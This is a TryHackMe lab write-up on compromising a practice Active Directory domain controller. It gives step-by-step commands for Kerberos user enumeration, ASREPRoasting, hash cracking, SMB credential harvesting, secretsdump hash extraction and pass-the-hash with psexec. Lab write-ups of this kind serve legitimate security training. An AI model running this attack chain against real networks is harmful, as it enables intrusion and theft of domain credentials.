99% of Corporate networks run off Active Directory. From exploiting this vulnerable Windows server (hosted on TryHackMe) we will have a basic understanding on how to exploit a vulnerable Active Directory enviornment 

Core Objectives:

* AD Enumeration
* Kerberos
* Cracking Hashes
* Impacket


## Step 1: Establish VPN Connection to target machine 

Initiate the VPN connection (OpenVPN) and deploy the machine

## Step 2: Impacket

Install Impacket, this is a collection of Python classes for working with network protocols. To learn more information about Impacket and have and overview about some of its tools you can look [here](https://www.secureauth.com/labs/open-source-tools/impacket).  
Have a look at [this](https://github.com/SecureAuthCorp/impacket.git) Github repository to learn how to install it.

## Step 3: Enumeration 1

We start by adding the IP address of our machine to the /etc/hosts

~~~
echo 10.10.194.183 spookysec.local >> /etc/hosts
~~~

Basic nmap scan to discover what we are working with

~~~
nmap spookysec.local
~~~

![nmap](/img/ADnmap.png)

Using the first scan we will use the ports discovered and run a more complete scan.

~~~
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389 -A -T4 spookysec.local
~~~

![nmapa](/img/ADnmapA.png)

From this scan we discover the Domain Name of the machine as well as the the full AD domain. 

## Step 4: Enumeration 2

Using enum4linux we are able to enumerate ports 139 and 445.


~~~
enum4linux -A  spookysec.local
~~~

![enum](/img/ADenum.png)


Once more, we managed retrieve information about the full AD domain name and the Domain Name of the machine plus some usernames that might be useful later on. 

Next, lets use the tool [Kerbrute](https://github.com/ropnop/kerbrute/), which can be installed using the  command:

~~~
go get github.com/ropnop/kerbrute
~~~

Kerbrute is a tool that performs Kerberos pre-auth bruteforcing, in this case we will be using the username bruteforce feature.

~~~
~/go/bin/kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt
~~~

![kerbrute](/img/ADkerbrute.png)

## Step 5: ASREPRoasting

From the output we are able to validate some active usernames.  
Now that we have discovered a several usernames we can use a technique called ASREPRoasting, meaning if a user does not have the Kerberos preauthentication property selected it is possible to retrieve the password hash from that user.
Impacket provides a tool called GetNPUsers.py which can query AD and if the property above is not selected it will export their TGT.

~~~
python3 GetNPUsers.py spookysec.local/svc-admin
~~~

![tgt](/img/ADasrep.png)

We are able to retrieve a hash from the svc-admin account, now proceed to crack the hash using hashcat. In order to discover the mode we can have a look at the [wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes).  
We have saved the previous hash in the hash.txt file.


~~~
hashcat -m 18200 hash.txt passwordlist.txt --force
~~~

## Step 6: Enumeration 3

Having user credentials we can attempt to log into SMB and explore any shares from the domain controller.
This is possible with the tool smbclient, make sure to use the user 'svc-admin' as well as the previous cracked password.

~~~
smbclient -L spookysec.local --user svc-admin
~~~

![smb](/img/ADsmb.png)

After exploring several shares, we found the file 'backup_credentials.txt'. 

~~~
smbclient \\\\spookysec.local\\backup --user svc-admin
~~~

![smb2](/img/ADsmb2.png)

Looking at the content of the file we can see it is encoded with Base64. To decode it simply use the following command:

~~~
base64 -d backup_credentials.txt
~~~

## Step 7: Escalating Privileges

Using the backup account we can use another tool from Impacket this time called 'secretsdump.py', which will enable us to get all the password hashes that this user account has access to.

~~~
python3 secretsdump.py -just-dc backup@spookysec.local
~~~

![secret](/img/ADsecret.png)

Now we are in possession of the Administrator password hash. The next step will be performing a [Pass the Hash Attack](https://attack.stealthbits.com/pass-the-hash-attack-explained). 
We can use another tool from Impacket called 'psexec.py', for this tool you must paste the complete Administrator hash in the following command:

~~~
python3 psexec.py Administrator:@spookysec.local -hashes <Complete Hash>
~~~

![rce](/img/ADfullcontrol.png)

We now have complete access to the AD Domain Controller
